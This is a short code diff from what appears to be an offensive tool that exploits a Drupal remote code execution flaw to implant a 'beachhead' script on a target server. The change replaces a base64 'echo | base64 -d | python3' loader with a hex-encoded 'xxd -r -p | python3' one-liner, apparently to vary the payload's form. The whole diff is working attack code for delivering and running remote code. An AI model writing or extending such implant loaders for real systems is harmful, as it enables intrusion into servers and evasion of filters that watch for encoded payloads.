@@ -1,6 +1,7 @@
 from include.BeachheadSender import BeachheadSender
 from include.DrupalCoderExec import DrupalCoderExec
 
+import binascii
 from base64 import b64encode
 import pathlib
 
@@ -10,8 +11,8 @@ BEACHHEAD_LOCATION = PARENT_DIR + 'include/BeachheadReceiver.py'
 def package_beachhead():
     with open(BEACHHEAD_LOCATION, 'r') as f:
         receiver = f.read()
-    b64_beachhead = b64encode(receiver.encode('utf-8')).decode('utf-8')
-    return "echo " + b64_beachhead + " | base64 -d | python3"
+    hex_beachhead = binascii.hexlify(receiver.encode('utf-8')).decode('utf-8')
+    return "xxd -r -p <<< " + hex_beachhead + " | python3"
 
 def implant_beachhead(ip_addr, port, path):
     beachhead = package_beachhead()
